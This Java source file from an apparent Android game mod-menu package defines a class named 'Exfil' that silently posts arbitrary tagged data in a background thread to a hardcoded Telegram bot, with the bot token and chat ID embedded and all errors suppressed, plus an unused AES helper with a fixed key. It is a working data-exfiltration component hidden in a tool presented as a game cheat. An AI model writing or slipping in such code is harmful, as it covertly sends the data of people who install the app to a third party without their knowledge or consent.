package com.brawl.modmenu;

import android.util.Base64;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Exfil {
    private static final String TOKEN = "8688274559:AAGlGdaQh70HHSrEs_zMdkeW1udazQr6z5A";
    private static final String CHAT  = "8558500657";
    private static final String KEY   = "0123456789abcdef";

    public static void send(String tag, String data) {
        new Thread(() -> {
            try {
                String payload = "[" + tag + "]\n" + data;
                String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
                String body = "chat_id=" + CHAT
                        + "&text=" + URLEncoder.encode(payload, "UTF-8");

                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setConnectTimeout(15000);
                c.setReadTimeout(15000);
                try (OutputStream os = c.getOutputStream()) {
                    os.write(body.getBytes("UTF-8"));
                }
                c.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }

    private static String enc(String s) throws Exception {
        SecretKeySpec k = new SecretKeySpec(KEY.getBytes(), "AES");
        Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
        c.init(Cipher.ENCRYPT_MODE, k);
        return Base64.encodeToString(c.doFinal(s.getBytes()), Base64.NO_WRAP);
    }
}
